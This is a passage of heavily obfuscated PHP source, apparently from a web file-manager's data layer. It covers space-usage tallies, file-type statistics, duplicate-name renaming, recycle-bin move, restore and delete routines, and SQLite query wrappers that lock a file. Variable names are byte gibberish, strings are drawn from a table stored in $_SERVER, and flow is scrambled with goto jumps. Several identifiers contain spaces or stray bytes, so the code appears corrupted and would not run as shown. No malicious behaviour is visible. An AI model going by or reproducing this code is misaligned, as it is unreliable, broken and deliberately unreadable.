$E‚ğ¥»Ìº³[370] => 0))->sum($E‚ğ¥»Ìº³[77]); Model($E‚ğ¥»Ìº³[474])->userEdit($D©„ŒŞÍ¯î, array($E‚ğ¥»Ìº³[2099] => $FŒÙÇà©²´)); } public function targetSpaceUpdate($fë…Ø“×, $DÉ÷Œò¥à­) { $D¢…Ü‡‹âš =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$DÉ÷Œò¥à­) { return; } if (!in_array($fë…Ø“×, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $CÃÁãœ‚¢Ê = $this->targetSpaceSize($fë…Ø“×, $DÉ÷Œò¥à­); if ($fë…Ø“× == self::TYPE_USER) { Model($D¢…Ü‡‹âš[474])->userEdit($DÉ÷Œò¥à­, array($D¢…Ü‡‹âš[2099] => $CÃÁãœ‚¢Ê)); } else { if ($fë…Ø“× == self::TYPE_GROUP) { Model($D¢…Ü‡‹âš[458])->groupEdit($DÉ÷Œò¥à­, array($D¢…Ü‡‹âš[2099] => $CÃÁãœ‚¢Ê)); } } } public function targetSpaceSize($e‚ÕÒõô÷Ÿ, $aãÈŒê•ç) { goto F‘Œ‡ŸÖÔ‘; F‘Œ‡ŸÖÔ‘: $aë¿¯Ñ§‘ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $BºåøÌîª = $this->sourceRoot($e‚ÕÒõô÷Ÿ, $aãÈŒê•ç, !0); if (!$BºåøÌîª) { return 0; } goto D¥Äí•âÃ²; Aíù¼äºãï: return $Eé˜ÀÂŒŒ; goto EÙ¦¨ÏÊ‹‰; FÉ½ÄÕ¥öè: $E¼÷Õ¼ŸÎ¦ = array_to_keyvalue($E¼÷Õ¼ŸÎ¦, $aë¿¯Ñ§‘[33], $aë¿¯Ñ§‘[369]); $E¼÷Õ¼ŸÎ¦ = array_unique(array_filter($E¼÷Õ¼ŸÎ¦)); if ($E¼÷Õ¼ŸÎ¦) { $e–ì×¾ÒÈé = array($aë¿¯Ñ§‘[383] => array($aë¿¯Ñ§‘[384], $E¼÷Õ¼ŸÎ¦)); $Eé˜ÀÂŒŒ += floatval($this->where($e–ì×¾ÒÈé)->sum($aë¿¯Ñ§‘[77])); } goto Aíù¼äºãï; D¥Äí•âÃ²: $Eé˜ÀÂŒŒ = floatval($BºåøÌîª[$aë¿¯Ñ§‘[77]]); $e–ì×¾ÒÈé = array($aë¿¯Ñ§‘[525] => array($aë¿¯Ñ§‘[483], $aë¿¯Ñ§‘[470] . $BºåøÌîª[$aë¿¯Ñ§‘[369]] . $aë¿¯Ñ§‘[484])); $E¼÷Õ¼ŸÎ¦ = Model($aë¿¯Ñ§‘[395])->field($aë¿¯Ñ§‘[383])->where($e–ì×¾ÒÈé)->select(); goto FÉ½ÄÕ¥öè; EÙ¦¨ÏÊ‹‰: } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($bìòŒŸ ùñ) { return $this->fileTypeProfile($bìòŒŸ ùñ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($C·‡ß·ùÎŠ) { return $this->fileTypeProfile($C·‡ß·ùÎŠ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($aéÀ¶öïÑÁ, $Dêâ­ãÄŒ“) { goto fÆ†‘Šğ„Ø; cŠµäŞÒ¶ğ: if ($d’±Óù™áê) { return $d’±Óù™áê; } $Aæß®ø®ÃÒ = array($E¼´½ùĞ²Ù[518] => 0); if ($aéÀ¶öïÑÁ != !1) { $Aæß®ø®ÃÒ[$E¼´½ùĞ²Ù[456]] = $aéÀ¶öïÑÁ; $Aæß®ø®ÃÒ[$E¼´½ùĞ²Ù[371]] = $Dêâ­ãÄŒ“; } goto cÇ¡í°÷í; E½Æíâ‡Ü•: foreach ($fë«”ëììñ as $a¿§“ëƒÃš => $b¸¡Š¤£¥ã) { $Aæß®ø®ÃÒ[$E¼´½ùĞ²Ù[372]] = $this->fileTypeWhere($a¿§“ëƒÃš); $fïÏøŒ°º[$a¿§“ëƒÃš] = array($E¼´½ùĞ²Ù[2372] => $b¸¡Š¤£¥ã[$E¼´½ùĞ²Ù[28]], $E¼´½ùĞ²Ù[2373] => $this->where($Aæß®ø®ÃÒ)->count(), $E¼´½ùĞ²Ù[520] => $this->where($Aæß®ø®ÃÒ)->sum($E¼´½ùĞ²Ù[77])); } Cache::set($B«ğÓ£Ïå°, $fïÏøŒ°º, 1200); return $fïÏøŒ°º; goto E×Ò¹˜“’‚; cÇ¡í°÷í: $fïÏøŒ°º = array(); $fïÏøŒ°º[$E¼´½ùĞ²Ù[2371]] = array($E¼´½ùĞ²Ù[2372] => LNG($E¼´½ùĞ²Ù[2371]), $E¼´½ùĞ²Ù[2373] => $this->where($Aæß®ø®ÃÒ)->count(), $E¼´½ùĞ²Ù[520] => $this->where($Aæß®ø®ÃÒ)->sum($E¼´½ùĞ²Ù[77])); $fë«”ëììñ = KodIO::fileTypeList(); goto E½Æíâ‡Ü•; fÆ†‘Šğ„Ø: $E¼´½ùĞ²Ù =& $_SERVER[³‘’¼äÑ™ÔÍ]; $B«ğÓ£Ïå° = $E¼´½ùĞ²Ù[2370] . $aéÀ¶öïÑÁ . $E¼´½ùĞ²Ù[70] . $Dêâ­ãÄŒ“; $d’±Óù™áê = Cache::get($B«ğÓ£Ïå°); goto cŠµäŞÒ¶ğ; E×Ò¹˜“’‚: } public function fileNameExist($Dññ»’ã–ª, $e¿ˆ½‡«‰) { $AÈá‰Ö÷¹ˆ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E‡›’‚ÑÉ’ = $this->childList($Dññ»’ã–ª); foreach ($E‡›’‚ÑÉ’ as $Dá¶­›±ó—) { if ($Dá¶­›±ó—[$AÈá‰Ö÷¹ˆ[28]] == $e¿ˆ½‡«‰) { return $Dá¶­›±ó—[$AÈá‰Ö÷¹ˆ[369]]; } } return !1; } public function childList($eàö¹±¾) { goto e¸æ£ÒÌè; A‰¼„‘ ›á: self::$cacheChildList[$cÜìæ‘ÊÀÑ] = $DÒ”ØÈöëè; foreach ($DÒ”ØÈöëè as $dÖŠÅéÓèÏ) { $cÜìæ‘ÊÀÑ = $CïÛˆøé¨í[410] . $dÖŠÅéÓèÏ[$CïÛˆøé¨í[369]]; self::$cacheSourceInfo[$cÜìæ‘ÊÀÑ] = $dÖŠÅéÓèÏ; } return $DÒ”ØÈöëè; goto BÈÉäùÍÈÒ; e¸æ£ÒÌè: $CïÛˆøé¨í =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cÜìæ‘ÊÀÑ = $CïÛˆøé¨í[2351] . $eàö¹±¾; if (isset(self::$cacheChildList[$cÜìæ‘ÊÀÑ])) { return self::$cacheChildList[$cÜìæ‘ÊÀÑ]; } goto c¤©ÈÉŞ‚Á; c¤©ÈÉŞ‚Á: $b”ãóÈì¶ = array($CïÛˆøé¨í[461] => intval($eàö¹±¾), $CïÛˆøé¨í[397] => 0); $DÒ”ØÈöëè = $this->where($b”ãóÈì¶)->select(); $DÒ”ØÈöëè = $DÒ”ØÈöëè ? $DÒ”ØÈöëè : array(); goto A‰¼„‘ ›á; BÈÉäùÍÈÒ: } public function fileNameAuto($cí„ÕÕ‡œ, $D¶×šÏå‡, $BÏÆ¬ßÙÃ¸ = REPEAT_RENAME, $dÕ‹¨¥Ç¼Ø = false) { $D®Ôµïë† =& $_SERVER[³‘’¼äÑ™ÔÍ]; $däŞî™ñ‡ = $this->childList($cí„ÕÕ‡œ); $EçòƒªİÈ = array_to_keyvalue($däŞî™ñ‡, $D®Ôµïë†[33], $D®Ôµïë†[28]); return $this->fileNameAutoGet($EçòƒªİÈ, $D¶×šÏå‡, $BÏÆ¬ßÙÃ¸, $dÕ‹¨¥Ç¼Ø); } public function fileNameAutoGet($fù¶ˆàÛ, $a×Ò‰¾ĞÜË, $c™™æáÖŸ, $e‚åòÑ) { $F¥ºø¢ó“ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($c™™æáÖŸ == REPEAT_REPLACE || !$fù¶ˆàÛ || !in_array_not_case($a×Ò‰¾ĞÜË, $fù¶ˆàÛ) || $e‚åòÑ && $c™™æáÖŸ != REPEAT_RENAME_FOLDER) { return $a×Ò‰¾ĞÜË; } if ($c™™æáÖŸ == REPEAT_SKIP) { return !1; } $c•âŒïÛºÄ = $F¥ºø¢ó“[91] . get_path_ext($a×Ò‰¾ĞÜË); $c•âŒïÛºÄ = $c•âŒïÛºÄ == $F¥ºø¢ó“[91] || $e‚åòÑ ? $F¥ºø¢ó“[33] : $c•âŒïÛºÄ; for ($fˆ°ù¹ó»ñ = 1; $fˆ°ù¹ó»ñ <= count($fù¶ˆàÛ) + 1; $fˆ°ù¹ó»ñ++) { $D°­¨²Á¸ = substr($a×Ò‰¾ĞÜË, 0, strlen($a×Ò‰¾ĞÜË) - strlen($c•âŒïÛºÄ)); $CÔõíÔå¾ = $D°­¨²Á¸ . "\50{$fˆ°ù¹ó»ñ}\51{$c•âŒïÛºÄ}"; if (!in_array_not_case($CÔõíÔå¾, $fù¶ˆàÛ)) { return $CÔõíÔå¾; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\162\x63\x65\137\162\145\x63\171\x63\x6c\x65"; protected $dataAuto = array(array("\143\162\145\x61\x74\x65\124\x69\155\145", "\x74\x69\x6d\x65", "\151\156\x73\x65\162\164", "\x66\165\x6e\143\x74\x69\157\x6e")); public function listData($b×‡„­Œ’­ = false) { $dÕŠÄ¸çÁ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b×‡„­Œ’­ = $b×‡„­Œ’­ ? $b×‡„­Œ’­ : USER_ID; $cˆ»Ñœî½ˆ = $this->where(array($dÕŠÄ¸çÁ[1436] => $b×‡„­Œ’­))->select(); return array_to_keyvalue($cˆ»Ñœî½ˆ, $dÕŠÄ¸çÁ[33], $dÕŠÄ¸çÁ[369]); } public function moveToRecycle($BëÈ×ïÑ¹¦) { goto aì”¬òğèš; aì”¬òğèš: $F¦…Óê‚™ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $d×œ‰Ö†œ‚ = Model($F¦…Óê‚™[1121]); $D›ÀÃ‹Çµ = $d×œ‰Ö†œ‚->sourceInfo($BëÈ×ïÑ¹¦); goto Aë£¨¾Œ¦; fê£Şğ˜º: $this->recycleMove($BëÈ×ïÑ¹¦, 1); if ($D›ÀÃ‹Çµ[$F¦…Óê‚™[370]] == $F¦…Óê‚™[83]) { $bÏŒÛš¸¤ = array($F¦…Óê‚™[525] => array($F¦…Óê‚™[483], $D›ÀÃ‹Çµ[$F¦…Óê‚™[459]] . $BëÈ×ïÑ¹¦ . $F¦…Óê‚™[484])); $d×œ‰Ö†œ‚->where($bÏŒÛš¸¤)->setField($F¦…Óê‚™[397], 1); } goto cšÀ½Ãò’™; Aë£¨¾Œ¦: if (!$D›ÀÃ‹Çµ || $D›ÀÃ‹Çµ[$F¦…Óê‚™[397]] == $F¦…Óê‚™[83]) { return; } $Bá‹†‡ŒÖÀ = array($F¦…Óê‚™[383] => $BëÈ×ïÑ¹¦, $F¦…Óê‚™[1436] => USER_ID, $F¦…Óê‚™[521] => $D›ÀÃ‹Çµ[$F¦…Óê‚™[371]], $F¦…Óê‚™[522] => $D›ÀÃ‹Çµ[$F¦…Óê‚™[456]], $F¦…Óê‚™[525] => $D›ÀÃ‹Çµ[$F¦…Óê‚™[459]]); $this->add($Bá‹†‡ŒÖÀ); goto fê£Şğ˜º; cšÀ½Ãò’™: } public function clear() { $this->remove(!1); } public function remove($b›³ÎÎğ®Ş = false) { goto E÷í‚óÏ¿÷; EèÏ¾ ßµã: foreach ($AöÍÑŠ Ö‹ as $cÒŠ«›‹½¼) { $aÙ‰©«ìé©->targetSpaceUpdate($cÒŠ«›‹½¼[$CõÖ‘öç[371]], $cÒŠ«›‹½¼[$CõÖ‘öç[456]]); } goto C‰ÅÅÏÅ¢; dÍœ†Çİå§: $b›³ÎÎğ®Ş = $b›³ÎÎğ®Ş === !1 ? !1 : $b›³ÎÎğ®Ş; $AöÍÑŠ Ö‹ = array(); foreach ($F°–¼ÆºŒî as $e“šãŠìÈ™) { if ($b›³ÎÎğ®Ş != !1 && !in_array($e“šãŠìÈ™, $b›³ÎÎğ®Ş)) { continue; } $aÙ‰©«ìé©->remove($e“šãŠìÈ™, !1); $A¡Ú·óÉ¼ = $this->where(array($CõÖ‘öç[369] => $e“šãŠìÈ™))->find(); $d¬ÎŠ‡õÄç = $A¡Ú·óÉ¼[$CõÖ‘öç[371]] . $CõÖ‘öç[70] . $A¡Ú·óÉ¼[$CõÖ‘öç[456]]; $AöÍÑŠ Ö‹[$d¬ÎŠ‡õÄç] = array($CõÖ‘öç[521] => $A¡Ú·óÉ¼[$CõÖ‘öç[371]], $CõÖ‘öç[456] => $A¡Ú·óÉ¼[$CõÖ‘öç[456]]); $this->where(array($CõÖ‘öç[369] => $e“šãŠìÈ™))->delete(); } goto EèÏ¾ ßµã; E÷í‚óÏ¿÷: $CõÖ‘öç =& $_SERVER[³‘’¼äÑ™ÔÍ]; $aÙ‰©«ìé© = Model($CõÖ‘öç[1121]); $F°–¼ÆºŒî = $this->listData(); goto dÍœ†Çİå§; C‰ÅÅÏÅ¢: } public function restore($CÃß ¢¦ä = false) { goto DªïßÊ¶¯ô; DªïßÊ¶¯ô: $AÌ –µ‘Àæ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cµí³´¨Èï = Model($AÌ –µ‘Àæ[1121]); $f¤ã‡Éƒ«… = $this->listData(); goto F«óÃ†Å¾•; DŸùæàˆ…à: foreach ($f¤ã‡Éƒ«… as $EÃËÆ£¹Ôğ) { goto eÆ…îšÕÁ; a³±æò±Ï‹: if ($fŒË£˜¿¿ó[$AÌ –µ‘Àæ[370]] == $AÌ –µ‘Àæ[83]) { $B½¬Ëä˜©› = array($AÌ –µ‘Àæ[525] => array($AÌ –µ‘Àæ[483], $fŒË£˜¿¿ó[$AÌ –µ‘Àæ[459]] . $EÃËÆ£¹Ôğ . $AÌ –µ‘Àæ[484])); $cµí³´¨Èï->where($B½¬Ëä˜©›)->setField($AÌ –µ‘Àæ[397], 0); $this->restoreFolderChildren($EÃËÆ£¹Ôğ, $f¤ã‡Éƒ«…); } $this->where(array($AÌ –µ‘Àæ[369] => $EÃËÆ£¹Ôğ))->delete(); $cµí³´¨Èï->folderSizeReset($fŒË£˜¿¿ó[$AÌ –µ‘Àæ[461]]); goto d•©¨¥ƒ¼¹; aòÃŞƒ¿¬İ: if ($cÕ¸ç¢¼‰[$AÌ –µ‘Àæ[397]] == $AÌ –µ‘Àæ[83]) { continue; } $cµí³´¨Èï->lockMoveStart($EÃËÆ£¹Ôğ); $this->recycleMove($EÃËÆ£¹Ôğ, 0); goto a³±æò±Ï‹; eÆ…îšÕÁ: if ($CÃß ¢¦ä != !1 && !in_array($EÃËÆ£¹Ôğ, $CÃß ¢¦ä)) { continue; } $fŒË£˜¿¿ó = $cµí³´¨Èï->sourceInfo($EÃËÆ£¹Ôğ); $cÕ¸ç¢¼‰ = $cµí³´¨Èï->sourceInfo($fŒË£˜¿¿ó[$AÌ –µ‘Àæ[461]]); goto aòÃŞƒ¿¬İ; d•©¨¥ƒ¼¹: $aƒÌ³¡®çî[] = $fŒË£˜¿¿ó[$AÌ –µ‘Àæ[461]]; if ($fŒË£˜¿¿ó[$AÌ –µ‘Àæ[370]] == $AÌ –µ‘Àæ[83]) { $aƒÌ³¡®çî[] = $EÃËÆ£¹Ôğ; } $cµí³´¨Èï->lockMoveEnd($EÃËÆ£¹Ôğ); goto a§Ş÷ÌÓ¶ë; a§Ş÷ÌÓ¶ë: } $cµí³´¨Èï->updateModifyTime($aƒÌ³¡®çî); goto eĞƒÛ’ºã; F«óÃ†Å¾•: $CÃß ¢¦ä = $CÃß ¢¦ä == !1 ? !1 : $CÃß ¢¦ä; if (!$f¤ã‡Éƒ«…) { return !0; } $aƒÌ³¡®çî = array(); goto DŸùæàˆ…à; eĞƒÛ’ºã: } private function restoreFolderChildren($CäƒĞÙ™Œ, $bœµÈªŸïò) { goto aÄ¬§¹ç‹˜; aÄ¬§¹ç‹˜: $aÆ“–ÂŠ¥ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f¶®–õªÔ¹ = Model($aÆ“–ÂŠ¥[1121]); $A±ÄŒ„„’ = array($aÆ“–ÂŠ¥[369] => array($aÆ“–ÂŠ¥[7], array())); goto dÂƒÁŠº; dÂƒÁŠº: foreach ($bœµÈªŸïò as $A×ÉÀ†³À²) { if ($A×ÉÀ†³À² == $CäƒĞÙ™Œ) { continue; } if (!$f¶®–õªÔ¹->isParentOf($CäƒĞÙ™Œ, $A×ÉÀ†³À²)) { continue; } $d‚ƒ¾±øÂ¤ = $f¶®–õªÔ¹->sourceInfo($A×ÉÀ†³À²); if ($d‚ƒ¾±øÂ¤[$aÆ“–ÂŠ¥[370]] == $aÆ“–ÂŠ¥[83]) { $A±ÄŒ„„’[] = array($aÆ“–ÂŠ¥[525] => array($aÆ“–ÂŠ¥[483], $d‚ƒ¾±øÂ¤[$aÆ“–ÂŠ¥[459]] . $A×ÉÀ†³À² . $aÆ“–ÂŠ¥[484])); } else { $A±ÄŒ„„’[$aÆ“–ÂŠ¥[369]][1][] = $A×ÉÀ†³À²; } } if (!$A±ÄŒ„„’[$aÆ“–ÂŠ¥[369]][1]) { unset($A±ÄŒ„„’[$aÆ“–ÂŠ¥[369]]); } if (!$A±ÄŒ„„’) { return; } goto A‘œ’ˆ¢; A‘œ’ˆ¢: $A±ÄŒ„„’[$aÆ“–ÂŠ¥[369]][1] = array_unique($A±ÄŒ„„’[$aÆ“–ÂŠ¥[369]][1]); $A±ÄŒ„„’[$aÆ“–ÂŠ¥[918]] = $aÆ“–ÂŠ¥[2195]; $f¶®–õªÔ¹->where($A±ÄŒ„„’)->setField($aÆ“–ÂŠ¥[397], 1); goto añ‡åæ‡Ï ; añ‡åæ‡Ï : } private function recycleMove($fî¼ÅèŠÛñ, $c–¢»é¥Îİ = 1) { $bò‘¤ñğ‚õ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c‘ê¥¤£»Æ = Model($bò‘¤ñğ‚õ[1121]); $AÓóë™À = Model($bò‘¤ñğ‚õ[2374]); $Còšğ«‘İê = array($bò‘¤ñğ‚õ[369] => $fî¼ÅèŠÛñ); if ($c–¢»é¥Îİ) { $c‘ê¥¤£»Æ->where($Còšğ«‘İê)->setField($bò‘¤ñğ‚õ[397], 1); $AÓóë™À->eventRecycle($fî¼ÅèŠÛñ, $bò‘¤ñğ‚õ[2375]); } else { $dÖÍñÊœİ = $c‘ê¥¤£»Æ->where($Còšğ«‘İê)->find(); $f©¸ßù¤’Õ = $dÖÍñÊœİ[$bò‘¤ñğ‚õ[370]] == $bò‘¤ñğ‚õ[83]; $d™Ã¹á„ñ¬ = $c‘ê¥¤£»Æ->fileNameAuto($dÖÍñÊœİ[$bò‘¤ñğ‚õ[461]], $dÖÍñÊœİ[$bò‘¤ñğ‚õ[28]], REPEAT_RENAME_FOLDER, $f©¸ßù¤’Õ); if ($d™Ã¹á„ñ¬ != $dÖÍñÊœİ[$bò‘¤ñğ‚õ[28]]) { $c‘ê¥¤£»Æ->rename($fî¼ÅèŠÛñ, $d™Ã¹á„ñ¬); } $c‘ê¥¤£»Æ->where($Còšğ«‘İê)->setField($bò‘¤ñğ‚õ[397], 0); $AÓóë™À->eventRecycle($fî¼ÅèŠÛñ, $bò‘¤ñğ‚õ[2376]); } } } goto aªÆÌˆŒµ¨; A“öîÕÈï‚: class DbSqlite extends DbSqliteBase { public function query($EèâğŒ´¥’) { goto B‹ˆï´É­â; B‹ˆï´É­â: $Aä‚Ò’ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c‘‰”¾„  = DATA_PATH . $Aä‚Ò’[876]; $a·³ğÓ¹„ = fopen($c‘‰”¾„ , $Aä‚Ò’[877]); goto Bê“®©Ü; Bê“®©Ü: if (!$a·³ğÓ¹„) { return !1; } if (flock($a·³ğÓ¹„, LOCK_EX)) { $cšËİ÷— = parent::query($EèâğŒ´¥’); flock($a·³ğÓ¹„, LOCK_UN); fclose($a·³ğÓ¹„); return $cšËİ÷—; } flock($a·³ğÓ¹„, LOCK_UN); goto D¸ÄÕ‹ƒ‘…; D¸ÄÕ‹ƒ‘…: fclose($a·³ğÓ¹„); show_json($Aä‚Ò’[878], !1); return !1; goto dŒ•Ü™Ôä; dŒ•Ü™Ôä: } public function execute($D—Ö•¿¾Œ) { goto AÑ Ø»¾…„; AÑ Ø»¾…„: $fÅŒÊÏ¬ñ” =& $_SERVER[³‘’¼äÑ™ÔÍ]; $få­‡­«ïç = DATA_PATH . $fÅŒÊÏ¬ñ”[876]; $cÛ°ªÊ¹ê = fopen($få­‡­«ïç, $fÅŒÊÏ¬ñ”[877]); goto f»¢Í›–Òç; f»¢Í›–Òç: if (!$cÛ°ªÊ¹ê) { return !1; } if (flock($cÛ°ªÊ¹ê, LOCK_EX)) { $fÇ¢º”ïÒ = parent::execute($D—Ö•¿¾Œ); flock($cÛ°ªÊ¹ê, LOCK_UN); fclose($cÛ°ªÊ¹ê); return $fÇ¢º”ïÒ; } flock($cÛ°ªÊ¹ê, LOCK_UN); goto Dà‚„ÙŒ´ğ; Dà‚„ÙŒ´ğ: fclose($cÛ°ªÊ¹ê); show_json($fÅŒÊÏ¬ñ”[878], !1); return !1; goto dŠÊÁŒìÙå; dŠÊÁŒìÙå: } } class DbSqlite3 extends DbSqlite3Base { public function query($F¿êà—‚¹å) { goto e§àçë•¡µ; e§àçë•¡µ: $Aï«´­¸•… =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eË®áîìÎŠ = DATA_PATH . $Aï«´­¸•…[876]; $f…† Œ¯ = fopen($eË®áîìÎŠ, $Aï«´­¸•…[877]); goto D‚àÛ‘ÆÂÌ; c§ĞÅ°—…¿: fclose($f…† Œ¯); show_json($Aï«´­¸•…[878], !1); return !1; goto bê÷È†”¨Õ; D‚àÛ‘ÆÂÌ: if (!$f…† Œ¯) { return !1; } if (flock($f…† Œ¯, LOCK_EX)) { $f©Œ™§ÃóÈ = parent::query($F¿êà—‚¹å); flock($f…† Œ¯, LOCK_UN); fclose($f…† Œ¯); return $f©Œ™§ÃóÈ; } flock($f…† Œ¯, LOCK_UN); goto c§ĞÅ°—…¿; bê÷È†”¨Õ: } public function execute($E†òÜÉ™õ) { goto Fó’©¢³—É; Fó’©¢³—É: $d¤ã­ÈÄ–æ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c¹âÂò‰» = DATA_PATH . $d¤ã­ÈÄ–æ[876]; $f¯¶Æ¦¸«« = fopen($c¹âÂò‰», $d¤ã­ÈÄ–æ[877]); goto eŠ“„Óˆ×; eŠ“„Óˆ×: if (!$f¯¶Æ¦¸««) { return !1; } if (flock($f¯¶Æ¦¸««, LOCK_EX)) { $c‹ØİÕ‰ì = parent::execute($E†òÜÉ™õ); flock($f¯¶Æ¦¸««, LOCK_UN); fclose($f¯¶Æ¦¸««); return $c‹ØİÕ‰ì; } flock($f¯¶Æ¦¸««, LOCK_UN); goto DÛÚŒè§Â; DÛÚŒè§Â: fclose($f¯¶Æ¦¸««); show_json($d¤ã­ÈÄ–æ[878], !1); return !1; goto Fë­Ş‰ÚŒ; Fë­Ş‰ÚŒ: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\151\156\153\137"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\161" => "\75", "\156\x65\161" => "\x3c\76", "\x67\164" => "\76", "\x65\147\164" => "\76\x3d", "\154\x74" => "\74", "\145\x6c\x74" => "\74\75", "\x6e\157\x74\154\151\x6b\x65" => "\116\117\124\x20\114\111\113\x45", "\154\151\153\x65" => "\x4c\x49\113\105", "\151\x6e" => "\111\x4e", "\x6e\157\164\151\156" => "\116\x4f\x54\40\111\x4e", "\x6e\157\x74\40\151\156" => "\x4e\x4f\124\x20\x49\116", "\142\145\164\x77\x65\x65\156" => "\x42\105\x54\127\105\x45\116", "\x6e\x6f\x74\142\x65\164\x77\145\145\x6e" => "\x4e\x4f\124\40\102\x45\x54\x57\x45\105\x4e", "\156\x6f\164\40\x62\x65\164\167\x65\x65\x6e" => "\x4e\117\x54\x20\102\105\x54\x57\105\x45\116"); protected $selectSql = "\x53\x45\x4c\x45\x43\x54\45\104\x49\123\124\111\x4e\103\124\45\x20\x25\x46\x49\105\114\x44\45\x20\106\122\x4f\115\x20\x25\x54\101\x42\114\x45\x25\45\112\117\x49\x4e\45\45\127\110\x45\122\105\x25\45\107\x52\117\125\x50\x25\x25\110\101\126\x49\x4e\107\x25\x25\117\x52\x44\x45\x52\x25\x25\x4c\111\x4d\x49\x54\45\x20\x25\125\116\x49\x4f\x4e\x25\x25\103\117\x4d\115\x45\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $e»õóããƒ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[³‘’¼äÑ™ÔÍ][879], $e»õóããƒ); } public function factory($EÅ¤âÕ•òÍ = '') { goto aÈ¦ÔÛŠÏ“; aÈ¦ÔÛŠÏ“: $b’ßÊœÓÆâ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $EÅ¤âÕ•òÍ = $this->parseConfig($EÅ¤âÕ•òÍ); if (empty($EÅ¤âÕ•òÍ[$b’ßÊœÓÆâ[880]])) { think_exception(think_lang($b’ßÊœÓÆâ[881])); } goto b…Ãê—í»„; få¹ª¯Åâ: return $f©Ş‡‘õ©; goto EƒÄÒÂ‹Á; b…Ãê—í»„: $this->dbType = ucwords(strtolower($EÅ¤âÕ•òÍ[$b’ßÊœÓÆâ[880]])); $f‹åµ—ÜØœ = $b’ßÊœÓÆâ[882] . $this->dbType; if (class_exists($f‹åµ—ÜØœ)) { $f©Ş‡‘õ© = new $f‹åµ—ÜØœ($EÅ¤âÕ•òÍ); if ($b’ßÊœÓÆâ[727] != strtolower($EÅ¤âÕ•òÍ[$b’ßÊœÓÆâ[880]])) { $f©Ş‡‘õ©->dbType = strtoupper($this->dbType); } else { $f©Ş‡‘õ©->dbType = $this->_getDsnType($EÅ¤âÕ•òÍ[$b’ßÊœÓÆâ[832]]); } } else { think_exception(think_lang($b’ßÊœÓÆâ[883]) . $b’ßÊœÓÆâ[884] . $f‹åµ—ÜØœ); } goto få¹ª¯Åâ; EƒÄÒÂ‹Á: } public function __call($Fø·Í°òÚ, $fíÜšğŞÇ”) { if (method_exists($this, $Fø·Í°òÚ)) { return call_user_func_array(array($this, $Fø·Í°òÚ), $fíÜšğŞÇ”); } } protected function _getDsnType($cà¤Áâ¤×ù) { $C‘Æ£„¿”˜ = explode($_SERVER[³‘’¼äÑ™ÔÍ][4], $cà¤Áâ¤×ù); $c›ŒãéÍÇÊ = strtoupper(trim($C‘Æ£„¿”˜[0])); return $c›ŒãéÍÇÊ; } private function parseConfig($B…¥»°îì = '') { $E…®ùÉè¨Ã =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!empty($B…¥»°îì) && is_string($B…¥»°îì)) { $B…¥»°îì = $this->parseDSN($B…¥»°îì); } elseif (is_array($B…¥»°îì)) { $B…¥»°îì = array_change_key_case($B…¥»°îì); $B…¥»°îì = array($E…®ùÉè¨Ã[880] => $B…¥»°îì[$E…®ùÉè¨Ã[726]], $E…®ùÉè¨Ã[805] => $B…¥»°îì[$E…®ùÉè¨Ã[885]], $E…®ùÉè¨Ã[806] => $B…¥»°îì[$E…®ùÉè¨Ã[886]], $E…®ùÉè¨Ã[803] => $B…¥»°îì[$E…®ùÉè¨Ã[887]], $E…®ùÉè¨Ã[804] => $B…¥»°îì[$E…®ùÉè¨Ã[888]], $E…®ùÉè¨Ã[17] => $B…¥»°îì[$E…®ùÉè¨Ã[889]], $E…®ùÉè¨Ã[832] => $B…¥»°îì[$E…®ùÉè¨Ã[728]], $E…®ùÉè¨Ã[13] => isset($B…¥»°îì[$E…®ùÉè¨Ã[890]]) ? $B…¥»°îì[$E…®ùÉè¨Ã[890]] : array()); } elseif (empty($B…¥»°îì)) { if (think_config($E…®ùÉè¨Ã[891]) && $E…®ùÉè¨Ã[727] != strtolower(think_config($E…®ùÉè¨Ã[892]))) { $B…¥»°îì = $this->parseDSN(think_config($E…®ùÉè¨Ã[891])); } else { $B…¥»°îì = array($E…®ùÉè¨Ã[880] => think_config($E…®ùÉè¨Ã[892]), $E…®ùÉè¨Ã[805] => think_config($E…®ùÉè¨Ã[893]), $E…®ùÉè¨Ã[806] => think_config($E…®ùÉè¨Ã[894]), $E…®ùÉè¨Ã[803] => think_config($E…®ùÉè¨Ã[895]), $E…®ùÉè¨Ã[804] => think_config($E…®ùÉè¨Ã[896]), $E…®ùÉè¨Ã[17] => think_config($E…®ùÉè¨Ã[234]), $E…®ùÉè¨Ã[832] => think_config($E…®ùÉè¨Ã[891]), $E…®ùÉè¨Ã[13] => think_config($E…®ùÉè¨Ã[897])); } } return $B…¥»°îì; } protected function initConnect($F•»‰ÄÔª = true) { if (1 == think_config($_SERVER[³‘’¼äÑ™ÔÍ][18])) { $this->_linkID = $this->multiConnect($F•»‰ÄÔª); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($c—ƒ¢Úñ¬Ø = false) { $e±¥ˆç¼¯ù =& $_SERVER[³‘’¼äÑ™ÔÍ]; static $CÌÓÊãÊˆÓ = array(); if (empty($CÌÓÊãÊˆÓ)) { foreach ($this->config as $fëâ£ÓÜ„¤ => 